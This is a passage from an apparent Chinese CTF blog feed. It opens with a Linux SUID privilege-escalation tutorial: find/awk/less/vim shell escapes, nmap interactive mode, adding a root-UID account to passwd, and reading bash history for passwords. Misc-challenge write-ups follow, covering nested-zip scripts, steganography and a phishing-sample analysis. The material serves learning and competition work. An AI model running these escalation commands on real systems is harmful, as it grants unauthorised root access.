&gt;表示重定向</span><br><span class="line"># /dev/null是一个特殊的文件系统对象，它将丢弃写入其中的所有内容。</span><br></pre></td></tr></table></figure><p>查找如下：</p><img src="屏幕截图 2025-01-27 160340.png" alt="屏幕截图 2025-01-27 160340" style="zoom:80%;"><p>ls一下看看是否设置了suid权限</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ls -al /usr/bin/su</span><br><span class="line">#查看/usr/bin/su有无suid权限</span><br></pre></td></tr></table></figure><p>如果看到确实设置了suid权限，而且属主为root，现在我们就可以利用我们之前提到的suid可执行二进制文件从而进行提权。</p><h2 id="进行提权"><a href="#进行提权" class="headerlink" title="进行提权"></a>进行提权</h2><p><strong>这里的前提都是要有suid权限</strong></p><p>如果之前查找到的<code>usr/bin/find</code>具有root权限，就用find命令进行提权</p><h3 id="find"><a href="#find" class="headerlink" title="find"></a>find</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">find filename -exec whoami \; -quit</span><br><span class="line"># root</span><br><span class="line">find filename -exec /bin/sh -p \; -quit</span><br><span class="line"># whoami</span><br><span class="line"># root</span><br><span class="line"></span><br><span class="line"># 这里的filename对应的文件要有suid权限，比如之前看到/usr/bin/su有suid权限这里就是/usr/bin/su</span><br></pre></td></tr></table></figure><p>还有一种差不多的提权方法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#先前利用以上查找suid文件查询到了/usr/bin/find 有suid权限</span><br><span class="line">touch 1.txt #创建1.txt</span><br><span class="line">/usr/bin/find 1.txt -exec whoami \;</span><br></pre></td></tr></table></figure><p>好像也可以：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find /etc/passwd -exec /bin/bash -p \;</span><br></pre></td></tr></table></figure><p>如果最后出了个<code>root</code>就说明提权成功了</p><p>同理，不只find命令，有很多赋予suid权限的文件可以达到权限提升的效果(实际上也和rbash逃逸、sudo提权那些获取shell的命令相似)，这里列举几个：</p><table><thead><tr><th align="left">suid文件</th><th align="left">提权命令</th></tr></thead><tbody><tr><td align="left">&#x2F;usr&#x2F;bin&#x2F;bash</td><td align="left">bash -p</td></tr><tr><td align="left">&#x2F;usr&#x2F;bin&#x2F;csh</td><td align="left">csh -b</td></tr><tr><td align="left">&#x2F;usr&#x2F;bin&#x2F;sh</td><td align="left">sh -p</td></tr><tr><td align="left">&#x2F;usr&#x2F;bin&#x2F;ksh</td><td align="left">ksh -p</td></tr><tr><td align="left">&#x2F;usr&#x2F;bin&#x2F;zsh</td><td align="left">zsh</td></tr><tr><td align="left">&#x2F;usr&#x2F;bin&#x2F;find</td><td align="left">find &#x2F;etc&#x2F;passwd -exec &#x2F;bin&#x2F;bash -p ;</td></tr><tr><td align="left">&#x2F;usr&#x2F;bin&#x2F;awk</td><td align="left">awk ‘BEGIN {system(“&#x2F;bin&#x2F;bash”)}’</td></tr><tr><td align="left">&#x2F;usr&#x2F;bin&#x2F;man</td><td align="left">!&#x2F;bin&#x2F;bash</td></tr><tr><td align="left">&#x2F;usr&#x2F;bin&#x2F;more</td><td align="left">!&#x2F;bin&#x2F;bash</td></tr></tbody></table><p><strong>利用相关命令均可在这个网站上查询</strong>：<a href="https://gtfobins.github.io/">GTFOBins</a></p><h3 id="namp"><a href="#namp" class="headerlink" title="namp"></a>namp</h3><p>适用版本：nmap2.02至5.21。</p><p>nmap是一个经典的端口扫描工具，当目标主机存在版本在2.02-5.21之间的nmap且os的版本在上面受影响的范围内或更早就可以尝试使用这种方法进行提权。</p><p>首先是进入nmap交互模式</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap --interactive</span><br></pre></td></tr></table></figure><p>之后利用命令进行提权</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">nmap&gt; !sh</span><br><span class="line"></span><br><span class="line">sh-3.2# whoami</span><br><span class="line">root</span><br></pre></td></tr></table></figure><h3 id="less-more"><a href="#less-more" class="headerlink" title="less&#x2F;more"></a>less&#x2F;more</h3><p>使用more和less一定读取一个比较大的文件，如果文件太小无法进入翻页功能，无法使用<code>!</code>命令进入shell。</p><p>less与more相似，以less为例</p><p>less是一种查看文件的命令，但是我们也可以利用less进行执行我们的shell命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">less /etc/passwd</span><br></pre></td></tr></table></figure><p>之后进入交互界面，输入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">!/bin/sh</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">VISUAL=&quot;/bin/sh -c &#x27;/bin/sh&#x27;&quot; less /etc/profile</span><br><span class="line">v</span><br><span class="line"></span><br><span class="line">less /etc/profile</span><br><span class="line">v:shell</span><br></pre></td></tr></table></figure><p>就可以进入交互界面然后写入shell的</p><h3 id="nano"><a href="#nano" class="headerlink" title="nano"></a>nano</h3><p>nano进入shell页面似乎比较简单</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">nano</span><br><span class="line">ctrl + R</span><br><span class="line">ctrl + X</span><br><span class="line">#shell</span><br></pre></td></tr></table></figure><h3 id="cp-mv"><a href="#cp-mv" class="headerlink" title="cp&#x2F;mv"></a>cp&#x2F;mv</h3><p>以cp为例</p><p>主要是利用cp命令覆盖&#x2F;etc&#x2F;passwd从而进行提权</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">whoami</span><br><span class="line">#qszd</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl passwd -1 -salt test testaaa</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &#x27;test:$1$test$giCVmzusADSPMon2mwEWo1:0:0::/root/:/bin/sh&#x27; &gt;&gt; passwd</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/passwd</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">su - test</span><br></pre></td></tr></table></figure><h3 id="vi-vim"><a href="#vi-vim" class="headerlink" title="vi&#x2F;vim"></a>vi&#x2F;vim</h3><p>vim为例</p><p>首先是一种比较特殊的情况，就是vim被配置了suid权限，所以只有root才能有权限进行读写，这种时候就是</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim.tiny /etc/passwd</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">:!/bin/sh</span><br></pre></td></tr></table></figure><h1 id="其他提权"><a href="#其他提权" class="headerlink" title="其他提权"></a>其他提权</h1><h2 id="通过查询历史记录从而获得信息泄露的信息"><a href="#通过查询历史记录从而获得信息泄露的信息" class="headerlink" title="通过查询历史记录从而获得信息泄露的信息"></a>通过查询历史记录从而获得信息泄露的信息</h2><p>利用以下命令可以获取</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat ~/.bash_history</span><br></pre></td></tr></table></figure><p>这个命令可以查看当前用户使用过的历史命令</p><p>有可能会得到root登录的密码</p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2024冬季春秋杯部分wp</title>
      <link href="/2025/01/2024%E5%86%AC%E5%AD%A3%E6%98%A5%E7%A7%8B%E6%9D%AF%E9%83%A8%E5%88%86wp/"/>
      <url>/2025/01/2024%E5%86%AC%E5%AD%A3%E6%98%A5%E7%A7%8B%E6%9D%AF%E9%83%A8%E5%88%86wp/</url>
      
        <content type="html"><![CDATA[<p>全部解析可以在春秋伽玛的公众号上看到</p><p>这里仅是本人写的部分wp</p><h1 id="1-See-anything-in-these-pics"><a href="#1-See-anything-in-these-pics" class="headerlink" title="1.See anything in these pics?"></a>1.See anything in these pics?</h1><p>拿到一个zip和二维码</p><p>二维码拖进这个网站扫一下 <a href="https://qrcode-decoder.com/">QR Code Decoder | QR Code Scanner</a></p><p>得到5FIVE，解压zip，拿到一张图片</p><p>因为提示我们不止一张图片，于是我们foremost一下</p><p>又得到一个图片</p><p>图片拖进随波逐流直接出了,原来是宽高改了</p><img src="屏幕截图 2025-01-17 145430.png" alt="屏幕截图 2025-01-17 145430" style="zoom:50%;"><h1 id="2-简单算术"><a href="#2-简单算术" class="headerlink" title="2.简单算术"></a>2.简单算术</h1><p>拿到ys<del>xdg&#x2F;m@]mjkz@vl@z</del>lf&gt;b</p><p>提示我们想想异或</p><p>拖进随波逐流，暴力解密xor，keylength选2以上的，然后筛选有flag的，直接出了</p><img src="屏幕截图 2025-01-17 150108.png" alt="屏幕截图 2025-01-17 150108" style="zoom:80%;"><h1 id="3-简单镜像提取"><a href="#3-简单镜像提取" class="headerlink" title="3.简单镜像提取"></a>3.简单镜像提取</h1><p>还是比较简单的</p><p>拿到一个压缩包然后得到一个流量</p><p>我话不多说直接foremost得到一个img，点不开</p><p>然后我又foremost这个img就能拿到一个zip和一个xls</p><p>点开这个xls就能看到flag了</p><img src="屏幕截图 2025-01-17 151245.png" alt="屏幕截图 2025-01-17 151245" style="zoom:80%;"><h1 id="4-压力大，写个脚本吧"><a href="#4-压力大，写个脚本吧" class="headerlink" title="4.压力大，写个脚本吧"></a>4.压力大，写个脚本吧</h1><p>点开这个压缩包就明白了，意思是有100个zip，password是旁边这个txt经过base64解码后的，需要我们写脚本爆破他。</p><p>脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> zipfile</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">extract_nested_zips_with_base64_password</span>(<span class="params">initial_zip_path</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    解压嵌套压缩包，密码存储在对应的 `password_xx.txt` 文件中，并经过 Base64 解码。</span></span><br><span class="line"><span class="string">    文件解压到当前目录。</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    参数：</span></span><br><span class="line"><span class="string">    - initial_zip_path (str): 初始压缩包的路径。</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    current_zip_path = initial_zip_path</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="comment"># 获取当前压缩包的编号</span></span><br><span class="line">        base_name = os.path.splitext(os.path.basename(current_zip_path))[<span class="number">0</span>]</span><br><span class="line">        zip_number = base_name.split(<span class="string">&#x27;_&#x27;</span>)[-<span class="number">1</span>]  <span class="comment"># 提取编号部分</span></span><br><span class="line">        password_file = <span class="string">f&quot;password_<span class="subst">&#123;zip_number&#125;</span>.txt&quot;</span>  <span class="comment"># 对应的密码文件名</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 检查密码文件是否存在</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(password_file):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;未找到密码文件: <span class="subst">&#123;password_file&#125;</span>，无法继续解压 <span class="subst">&#123;current_zip_path&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 读取密码并进行 Base64 解码</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(password_file, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> pf:</span><br><span class="line">                encoded_password = pf.read().strip()</span><br><span class="line">                password = base64.b64decode(encoded_password).decode(<span class="string">&#x27;utf-8&#x27;</span>)  <span class="comment"># 解码 Base64 密码</span></span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;处理密码文件 <span class="subst">&#123;password_file&#125;</span> 时出错: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 解压当前压缩包</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">with</span> zipfile.ZipFile(current_zip_path, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> zip_ref:</span><br><span class="line">                files = zip_ref.namelist()</span><br><span class="line">                <span class="keyword">if</span> <span class="keyword">not</span> files:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;current_zip_path&#125;</span> 是空压缩包。&quot;</span>)</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">                <span class="comment"># 筛选出下一个压缩包，忽略非 `.zip` 文件（如密码文件）</span></span><br><span class="line">                next_zip_path = <span class="literal">None</span></span><br><span class="line">                <span class="keyword">for</span> file_name <span class="keyword">in</span> files:</span><br><span class="line">                    zip_ref.extract(file_name, os.getcwd(), pwd=<span class="built_in">bytes</span>(password, <span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;password&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">                    <span class="comment"># 如果是 `.zip` 文件，记录路径以便继续解压</span></span><br><span class="line">                    <span class="keyword">if</span> file_name.endswith(<span class="string">&#x27;.zip&#x27;</span>):</span><br><span class="line">                        next_zip_path = os.path.join(os.getcwd(), file_name)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">except</span> RuntimeError <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;解压 <span class="subst">&#123;current_zip_path&#125;</span> 时密码错误或其他问题: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">except</span> zipfile.BadZipFile <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;current_zip_path&#125;</span> 不是有效的压缩包: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 如果没有下一个 `.zip` 文件，说明解压结束</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> next_zip_path:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;解压完成。最终文件存储在当前目录&quot;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        current_zip_path = next_zip_path  <span class="comment"># 更新路径，继续解压下一个 `.zip` 文件</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 参数设置</span></span><br><span class="line">initial_zip_path = <span class="string">&#x27;zip_99.zip&#x27;</span>  <span class="comment"># 初始压缩包名称</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 执行函数</span></span><br><span class="line">extract_nested_zips_with_base64_password(initial_zip_path)</span><br></pre></td></tr></table></figure><p>然后把得到一个flag-hint.txt是PASSWORD+PASSWORD.png</p><p>我们需要把所有密码连起来，去重，然后010得到一个png</p><p>就能得到flag了</p><h1 id="5-音频的秘密"><a href="#5-音频的秘密" class="headerlink" title="5.音频的秘密"></a>5.音频的秘密</h1><p>得到的音频提示是deepsound</p><p>我们使用deepsound2.2，发现需要密码（注意这里不能用deepsound2.0）</p><p>密码提示是弱密码，经尝试是123</p><p>然后得到一个flag.zip</p><p>由于是store压缩方式，所以尝试明文攻击</p><img src="屏幕截图 2025-01-19 183159.png" alt="屏幕截图 2025-01-19 183159" style="zoom:80%;"><p>然后得到了flag.png，lsb提取一下即可</p><img src="屏幕截图 2025-01-19 183239.png" alt="屏幕截图 2025-01-19 183239" style="zoom:80%;"><h1 id="6-Infinity"><a href="#6-Infinity" class="headerlink" title="6.Infinity"></a>6.Infinity</h1><p>题目给了一个png，可以foremost一下得到一个压缩包，点开发现还是一个压缩包，再点开还是一个压缩包，可以看出来是多层压缩包要写个脚本循环解压。</p><p>脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> zipfile</span><br><span class="line"><span class="keyword">import</span> tarfile</span><br><span class="line"><span class="keyword">import</span> py7zr</span><br><span class="line"></span><br><span class="line"><span class="comment"># 记录每层压缩包名字的列表</span></span><br><span class="line">compressed_files = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">extract_archive</span>(<span class="params">archive_path</span>):</span><br><span class="line">    <span class="keyword">global</span> compressed_files</span><br><span class="line">    <span class="comment"># 用于存储待解压的文件队列</span></span><br><span class="line">    to_extract = [archive_path]</span><br><span class="line">    <span class="comment"># 用于记录已经解压过的文件</span></span><br><span class="line">    extracted = <span class="built_in">set</span>()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> to_extract:</span><br><span class="line">        file_path = to_extract.pop(<span class="number">0</span>)</span><br><span class="line">        <span class="keyword">if</span> file_path <span class="keyword">in</span> extracted:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="comment"># 记录当前压缩包的名字</span></span><br><span class="line">        compressed_files.append(file_path)</span><br><span class="line">        extracted.add(file_path)</span><br><span class="line">        file_extension = os.path.splitext(file_path)[<span class="number">1</span>].lower()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> file_extension == <span class="string">&#x27;.zip&#x27;</span>:</span><br><span class="line">            <span class="comment"># 解压zip文件</span></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                <span class="keyword">with</span> zipfile.ZipFile(file_path, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> zip_ref:</span><br><span class="line">                    zip_ref.extractall(os.path.dirname(file_path))</span><br><span class="line">            <span class="keyword">except</span> zipfile.BadZipFile:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;文件 <span class="subst">&#123;file_path&#125;</span> 不是有效的 ZIP 文件或已损坏。&quot;</span>)</span><br><span class="line">        <span class="keyword">elif</span> file_extension == <span class="string">&#x27;.7z&#x27;</span>:</span><br><span class="line">            <span class="comment"># 解压7z文件</span></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                <span class="keyword">with</span> py7zr.SevenZipFile(file_path, mode=<span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> z:</span><br><span class="line">                    z.extractall(os.path.dirname(file_path))</span><br><span class="line">            <span class="keyword">except</span> py7zr.Bad7zFile:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;文件 <span class="subst">&#123;file_path&#125;</span> 不是有效的 7z 文件或已损坏。&quot;</span>)</span><br><span class="line">        <span class="keyword">elif</span> file_extension <span class="keyword">in</span> [<span class="string">&#x27;.tar&#x27;</span>, <span class="string">&#x27;.tar.gz&#x27;</span>, <span class="string">&#x27;.tar.bz2&#x27;</span>]:</span><br><span class="line">            <span class="comment"># 解压tar文件</span></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                <span class="keyword">with</span> tarfile.<span class="built_in">open</span>(file_path, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> tar_ref:</span><br><span class="line">                    tar_ref.extractall(os.path.dirname(file_path), <span class="built_in">filter</span>=<span class="string">&#x27;data&#x27;</span>)</span><br><span class="line">            <span class="keyword">except</span> tarfile.ReadError:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;文件 <span class="subst">&#123;file_path&#125;</span> 不是有效的 tar 文件或已损坏。&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;不支持的文件格式: <span class="subst">&#123;file_path&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 查找新生成的压缩包并添加到待解压队列</span></span><br><span class="line">        <span class="keyword">for</span> root, dirs, files <span class="keyword">in</span> os.walk(os.path.dirname(file_path)):</span><br><span class="line">            <span class="keyword">for</span> file <span class="keyword">in</span> files:</span><br><span class="line">                new_file_path = os.path.join(root, file)</span><br><span class="line">                new_extension = os.path.splitext(new_file_path)[<span class="number">1</span>].lower()</span><br><span class="line">                <span class="keyword">if</span> new_extension <span class="keyword">in</span> [<span class="string">&#x27;.zip&#x27;</span>, <span class="string">&#x27;.7z&#x27;</span>, <span class="string">&#x27;.tar&#x27;</span>, <span class="string">&#x27;.tar.gz&#x27;</span>, <span class="string">&#x27;.tar.bz2&#x27;</span>]:</span><br><span class="line">                    to_extract.append(new_file_path)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="comment"># 输入要解压的压缩包路径</span></span><br><span class="line">    archive_path = <span class="built_in">input</span>(<span class="string">&quot;请输入压缩包的路径: &quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> os.path.exists(archive_path):</span><br><span class="line">        extract_archive(archive_path)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;每层压缩包的名字:&quot;</span>)</span><br><span class="line">        <span class="keyword">for</span> file <span class="keyword">in</span> compressed_files:</span><br><span class="line">            <span class="built_in">print</span>(file)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;输入的路径不存在，请检查后重新输入。&quot;</span>)</span><br></pre></td></tr></table></figure><p>最后解压出来一个SeCr3t.txt</p><p>内容是 Inf1nityIsS0CoOL</p><p>然后将得到的文件名字由内而外（即倒过来）连起来，这里可以用cyberchef的reverse</p><p>由于题目提示：<strong>BASE58-Ripple、SM4-ECB</strong></p><img src="屏幕截图 2025-01-24 112458.png" alt="屏幕截图 2025-01-24 112458" style="zoom:80%;"><p>这里SM4的key就是之前的内容</p><p>将保存下来的内容010一下得到png，就能得到这样一个png</p><img src="无标题1.png" alt="无标题1" style="zoom:80%;"><p>然后二维码扫一下就可以了，网站： <a href="https://qrcode-decoder.com/">QR Code Decoder | QR Code Scanner</a></p><img src="屏幕截图 2025-01-24 112942.png" alt="屏幕截图 2025-01-24 112942" style="zoom:80%;"><p>出了</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> WP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> misc </tag>
            
            <tag> CTF </tag>
            
            <tag> WP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>18届软件创新攻防赛部分wp</title>
      <link href="/2025/01/18%E5%B1%8A%E8%BD%AF%E4%BB%B6%E5%88%9B%E6%96%B0%E6%94%BB%E9%98%B2%E8%B5%9B%E9%83%A8%E5%88%86wp/"/>
      <url>/2025/01/18%E5%B1%8A%E8%BD%AF%E4%BB%B6%E5%88%9B%E6%96%B0%E6%94%BB%E9%98%B2%E8%B5%9B%E9%83%A8%E5%88%86wp/</url>
      
        <content type="html"><![CDATA[<h1 id="1-钓鱼邮件"><a href="#1-钓鱼邮件" class="headerlink" title="1.钓鱼邮件"></a>1.钓鱼邮件</h1><p>拿到一个eml，可以用qq邮箱给自己写信，然后附件带上这个eml，之后自己就能收到这个邮件，预览一下可以看到：</p><img src="屏幕截图 2025-01-05 183618.png" alt="屏幕截图 2025-01-05 183618" style="zoom:75%;"><p>发现有一个<code>生日礼物.zip</code>，点击下载</p><p>下载得到的zip发现有密码，使用arp爆破一下得到密码：20001111</p><img src="屏幕截图 2025-01-05 183758.png" alt="屏幕截图 2025-01-05 183758" style="zoom: 50%;"><p>然后发现一个exe，双击运行。</p><p>然后使用火绒剑，监控网络，就能发现这个 生日礼物.exe</p><p>因为会实时变化，记得要截图看会好看一点。</p><img src="屏幕截图 2025-01-05 184101.png" alt="屏幕截图 2025-01-05 184101" style="zoom:75%;"><p>放大就能看到这个远程地址 222.218.218.218:55555</p><img src="屏幕截图 2025-01-05 184221.png" alt="屏幕截图 2025-01-05 184221" style="zoom:75%;"><p>包上md5得到flag：df3101212c55ea8c417ad799cfc6b509</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> WP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> misc </tag>
            
            <tag> CTF </tag>
            
            <tag> WP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>awd初体验</title>
      <link href="/2024/12/awd%E5%88%9D%E4%BD%93%E9%AA%8C/"/>
      <url>/2024/12/awd%E5%88%9D%E4%BD%93%E9%AA%8C/</url>
      
